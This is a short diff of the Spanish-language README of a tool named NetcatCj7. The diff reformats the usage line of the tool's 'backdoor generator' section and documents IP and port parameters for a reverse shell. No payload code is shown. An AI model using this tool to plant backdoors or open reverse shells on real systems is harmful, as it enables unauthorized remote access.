@@ -14,7 +14,10 @@
 ## Generador de backdoor :
 * bash NetcatCj7 -h
 * Sintaxis
-- > ` bash NetcatCj7 -i <IP> -p <PORT> -t <ShellReverse> `
+
+~~~
+bash NetcatCj7 -i <IP> -p <PORT> -t <ShellReverse> `
+~~~
 
 * IP >> Host para la reverse shell
 * PORT >> Puerto de escucha
